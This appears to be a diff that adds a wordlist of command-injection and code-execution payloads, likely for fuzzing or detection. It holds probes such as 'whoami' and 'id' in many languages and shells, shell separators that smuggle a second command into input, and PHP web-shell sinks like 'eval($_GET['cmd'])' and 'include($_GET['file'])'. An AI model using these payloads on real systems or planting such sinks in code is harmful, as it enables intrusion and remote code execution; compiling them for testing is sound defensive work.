@@ -1,0 +1,57 @@
+<?php system('whoami'); ?>
+eval('system(\"whoami\")')
+exec('whoami')
+system('whoami')
+passthru('whoami')
+shell_exec('whoami')
+`whoami`
+$(whoami)
+os.system('whoami')
+import os; os.system('whoami')
+subprocess.call('whoami')
+Runtime.getRuntime().exec('whoami')
+<?php echo shell_exec('whoami'); ?>
+cmd.exe /c whoami
+powershell whoami
+IEX(whoami)
+perl -e 'print `whoami`'
+ruby -e 'puts `whoami`'
+python -c 'import os; os.system(\"whoami\")'
+node -e 'require(\"child_process\").exec(\"whoami\")'
+;whoami
+|whoami
+&whoami
+&&whoami
+system('id')
+exec('id')
+`id`
+$(id)
+os.system('id')
+cmd.exe /c dir
+powershell dir
+perl -e 'print `id`'
+ruby -e 'puts `id`'
+python -c 'import os; os.system(\"id\")'
+node -e 'require(\"child_process\").exec(\"id\")'
+bash -c 'whoami'
+sh -c 'whoami'
+zsh -c 'whoami'
+ksh -c 'whoami'
+tcsh -c 'whoami'
+<?php echo `id`; ?>
+<% request.getParameter(\"cmd\"); %>
+eval($_GET['cmd'])
+assert($_GET['cmd'])
+create_function('', $_GET['cmd'])()
+preg_replace('/.*/e', $_GET['cmd'], '')
+${`$_GET[cmd]`}
+eval(base64_decode($_GET['cmd']))
+call_user_func($_GET['cmd'])
+call_user_func_array($_GET['cmd'], array())
+include($_GET['file'])
+require($_GET['file'])
+file_get_contents($_GET['url'])
+fopen($_GET['file'], 'r')
+readfile($_GET['file'])
+highlight_file($_GET['file'])
+show_source($_GET['file'])
